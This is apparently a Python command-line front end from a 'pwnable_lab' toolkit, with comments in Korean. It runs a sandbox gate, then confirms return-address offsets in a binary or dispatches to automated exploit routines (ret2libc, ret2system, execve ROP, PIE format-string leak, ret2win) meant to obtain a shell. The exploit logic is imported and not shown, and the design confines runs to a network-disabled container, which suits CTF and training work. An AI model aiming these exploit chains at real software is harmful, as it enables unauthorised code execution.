"""One-shot 샌드박스 워커 — 단일 바이너리의 반환 주소 오프셋을 확정한다.

이 프로세스는 **network-disabled 일회용 컨테이너 안에서** 실행되도록 설계됐다
(``docs/AUTO_EXPLOIT_SANDBOX.md``). 바이너리 경로 하나를 받아
:func:`~pwnable_lab.sandbox.confirm_return_offset` 를 돌리고,
:class:`~pwnable_lab.sandbox.OffsetConfirmation` 를 JSON 으로 stdout 에 출력한다.
사람이 읽는 로그·진단은 모두 stderr 로 보낸다(stdout 은 순수 JSON).

사용::

    python -m pwnable_lab.sandbox.cli /path/to/binary [--pattern-length N]
    # 또는 stdin 으로 바이너리 바이트 주입:
    python -m pwnable_lab.sandbox.cli --stdin < binary

종료 코드
--------
* 0 — 실행 완료(오프셋 확정 여부와 무관; JSON 의 ``confirmed`` 로 판단)
* 2 — 게이트/격리 마커 미충족 또는 샌드박스 구조적 실패(:class:`SandboxError`)
* 3 — 사용법/입출력 오류
"""

from __future__ import annotations

import argparse
import json
import os
import stat
import sys
import tempfile

from pwnable_lab.config import get_settings
from pwnable_lab.errors import SandboxError
from pwnable_lab.payload.pack import RopStep, build_overflow
from pwnable_lab.sandbox import (
    SandboxLimits,
    auto_execve_core,
    auto_execve_pie_core,
    auto_fmt_leak_pie_core,
    auto_ret2libc_core,
    auto_ret2system32_core,
    auto_ret2system_core,
    auto_ret2system_pie_core,
    auto_ret2win_pie_core,
    confirm_return_offset,
    require_sandbox_boundary,
    verify_payload,
)


def _build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        prog="pwnable_lab.sandbox.cli",
        description="일회용 샌드박스에서 반환 주소 오프셋을 동적으로 확정한다.",
    )
    src = parser.add_mutually_exclusive_group(required=True)
    src.add_argument("binary", nargs="?", help="실행할 바이너리 경로")
    src.add_argument(
        "--stdin",
        action="store_true",
        help="바이너리 바이트를 stdin 으로 읽는다(경로 대신).",
    )
    parser.add_argument(
        "--pattern-length",
        type=int,
        default=None,
        help="cyclic 패턴 길이(생략 시 PLAB_SANDBOX_PATTERN_LENGTH).",
    )
    parser.add_argument(
        "--verify",
        action="store_true",
        help="오프셋 확정 대신 ret2win payload 를 주입해 익스 성공을 검증한다.",
    )
    parser.add_argument(
        "--auto-ret2libc",
        action="store_true",
        dest="auto_ret2libc",
        help="완전 자동 2단계 ret2libc(leak→base→system→셸). --offset 필요.",
    )
    parser.add_argument(
        "--auto-ret2system",
        action="store_true",
        dest="auto_ret2system",
        help="완전 자동 ret2system(pop rdi→/bin/sh→system→셸). --offset 필요.",
    )
    parser.add_argument(
        "--auto-execve",
        action="store_true",
        dest="auto_execve",
        help="완전 자동 execve syscall ROP(pop*→/bin/sh→syscall→셸). --offset 필요.",
    )
    parser.add_argument(
        "--auto-ret2system32",
        action="store_true",
        dest="auto_ret2system32",
        help="i386 자동 ret2system(cdecl 스택 인자→system→셸). --offset 필요.",
    )
    parser.add_argument(
        "--auto-fmt-leak-pie",
        action="store_true",
        dest="auto_fmt_leak_pie",
        help="PIE 포맷스트링 in-band leak(오프셋 자체 확정→base 유출→셸). --offset 불필요.",
    )
    parser.add_argument(
        "--auto-execve-pie",
        action="store_true",
        dest="auto_execve_pie",
        help="PIE 자동 execve syscall ROP(base 관측→rebase→셸 증명). --offset 필요.",
    )
    parser.add_argument(
        "--auto-ret2win-pie",
        action="store_true",
        dest="auto_ret2win_pie",
        help="PIE 자동 ret2win(base 관측→rebase→셸/제어 증명). --offset 필요.",
    )
    parser.add_argument(
        "--auto-ret2system-pie",
        action="store_true",
        dest="auto_ret2system_pie",
        help="PIE 자동 ret2system(base 관측→rebase→셸 증명). --offset 필요.",
    )
    parser.add_argument("--offset", type=int, default=None, help="반환 오프셋")
    parser.add_argument(
        "--target", type=int, default=None, help="--verify: 점프할 대상 주소(정수)"
    )
    parser.add_argument("--bits", type=int, default=64, help="--verify: 32 또는 64")
    parser.add_argument(
        "--chain",
        action="append",
        default=[],
        type=lambda v: int(v, 0),
        dest="chain",
        help="--verify: target 뒤에 이어붙일 ROP 주소(반복 가능)",
    )
    parser.add_argument(
        "--marker",
        action="append",
        default=[],
        dest="markers",
        help="--verify: stdout 에 나타나면 성공으로 볼 문자열(반복 가능)",
    )
    return parser


def _materialize_stdin() -> str:
    data = sys.stdin.buffer.read()
    if not data:
        raise ValueError("stdin 에서 바이너리 바이트를 읽지 못했습니다.")
    fd, path = tempfile.mkstemp(prefix="plab-sbx-")
    try:
        with os.fdopen(fd, "wb") as fh:
            fh.write(data)
        os.chmod(path, stat.S_IRWXU)
    except OSError:
        try:
            os.unlink(path)
        except OSError:
            pass
        raise
    return path


def main(argv: list[str] | None = None) -> int:
    parser = _build_parser()
    args = parser.parse_args(argv)
    settings = get_settings()

    try:
        require_sandbox_boundary(settings)
    except SandboxError as exc:
        print(f"[sandbox-cli] 게이트 거부: {exc}", file=sys.stderr)
        return 2

    cleanup: str | None = None
    try:
        if args.stdin:
            binary_path = cleanup = _materialize_stdin()
        else:
            binary_path = args.binary
            if not os.path.isfile(binary_path):
                print(f"[sandbox-cli] 파일이 없습니다: {binary_path}", file=sys.stderr)
                return 3
    except (OSError, ValueError) as exc:
        print(f"[sandbox-cli] 입력 오류: {exc}", file=sys.stderr)
        return 3

    limits = SandboxLimits(
        wall_seconds=settings.sandbox_wall_seconds,
        cpu_seconds=settings.sandbox_cpu_seconds,
        address_space_bytes=settings.sandbox_address_space_bytes,
    )
    try:
        if args.auto_ret2libc:
            if args.offset is None:
                print(
                    "[sandbox-cli] --auto-ret2libc 는 --offset 이 필요합니다.",
                    file=sys.stderr,
                )
                return 3
            print(
                f"[sandbox-cli] auto_ret2libc 실행 (offset={args.offset})",
                file=sys.stderr,
            )
            output = auto_ret2libc_core(binary_path, offset=args.offset, limits=limits)
        elif args.auto_ret2system:
            if args.offset is None:
                print(
                    "[sandbox-cli] --auto-ret2system 은 --offset 이 필요합니다.",
                    file=sys.stderr,
                )
                return 3
            print(
                f"[sandbox-cli] auto_ret2system 실행 (offset={args.offset})",
                file=sys.stderr,
            )
            output = auto_ret2system_core(
                binary_path, offset=args.offset, limits=limits
            )
        elif args.auto_execve:
            if args.offset is None:
                print(
                    "[sandbox-cli] --auto-execve 는 --offset 이 필요합니다.",
                    file=sys.stderr,
                )
                return 3
            print(
                f"[sandbox-cli] auto_execve 실행 (offset={args.offset})",
                file=sys.stderr,
            )
            output = auto_execve_core(binary_path, offset=args.offset, limits=limits)
        elif args.auto_ret2system32:
            if args.offset is None:
                print(
                    "[sandbox-cli] --auto-ret2system32 는 --offset 이 필요합니다.",
                    file=sys.stderr,
                )
                return 3
            print(
                f"[sandbox-cli] auto_ret2system32 실행 (offset={args.offset})",
                file=sys.stderr,
            )
            output = auto_ret2system32_core(
                binary_path, offset=args.offset, limits=limits
            )
        elif args.auto_fmt_leak_pie:
            # 오프셋을 자체 확정하므로 --offset 불필요.
            print("[sandbox-cli] auto_fmt_leak_pie 실행", file=sys.stderr)
            output = auto_fmt_leak_pie_core(binary_path, limits=limits)
        elif args.auto_execve_pie:
            if args.offset is None:
                print(
                    "[sandbox-cli] --auto-execve-pie 는 --offset 이 필요합니다.",
                    file=sys.stderr,
                )
                return 3
            print(
                f"[sandbox-cli] auto_execve_pie 실행 (offset={args.offset})",
                file=sys.stderr,
            )
            output = auto_execve_pie_core(
                binary_path, offset=args.offset, limits=limits
            )
        elif args.auto_ret2win_pie:
            if args.offset is None:
                print(
                    "[sandbox-cli] --auto-ret2win-pie 는 --offset 이 필요합니다.",
                    file=sys.stderr,
                )
                return 3
            print(
                f"[sandbox-cli] auto_ret2win_pie 실행 (offset={args.offset})",
                file=sys.stderr,
            )
            output = auto_ret2win_pie_core(
                binary_path, offset=args.offset, limits=limits
            )
        elif args.auto_ret2system_pie:
            if args.offset is None:
                print(
                    "[sandbox-cli] --auto-ret2system-pie 는 --offset 이 필요합니다.",
                    file=sys.stderr,
                )
                return 3
            print(
                f"[sandbox-cli] auto_ret2system_pie 실행 (offset={args.offset})",
                file=sys.stderr,
            )
            output = auto_ret2system_pie_core(
                binary_path, offset=args.offset, limits=limits
            )
        elif args.verify:
            if args.offset is None or args.target is None:
                print(
                    "[sandbox-cli] --verify 는 --offset 과 --target 이 필요합니다.",
                    file=sys.stderr,
                )
                return 3
            payload = build_overflow(
                args.offset,
                args.target,
                bits=args.bits,
                chain=[RopStep(a) for a in args.chain],
            )
            print(
                f"[sandbox-cli] verify_payload 실행 "
                f"(offset={args.offset}, target=0x{args.target:x}, "
                f"chain={len(args.chain)})",
                file=sys.stderr,
            )
            output = verify_payload(
                binary_path, payload, success_markers=args.markers, limits=limits
            ).as_dict()
        else:
            length = args.pattern_length or settings.sandbox_pattern_length
            print(
                f"[sandbox-cli] confirm_return_offset 실행 (pattern_length={length})",
                file=sys.stderr,
            )
            output = confirm_return_offset(
                binary_path, pattern_length=length, limits=limits
            ).as_dict()
    except SandboxError as exc:
        print(f"[sandbox-cli] 샌드박스 오류: {exc}", file=sys.stderr)
        return 2
    finally:
        if cleanup is not None:
            try:
                os.unlink(cleanup)
            except OSError:
                pass

    json.dump(output, sys.stdout, ensure_ascii=False)
    sys.stdout.write("\n")
    return 0


if __name__ == "__main__":  # pragma: no cover
    raise SystemExit(main())
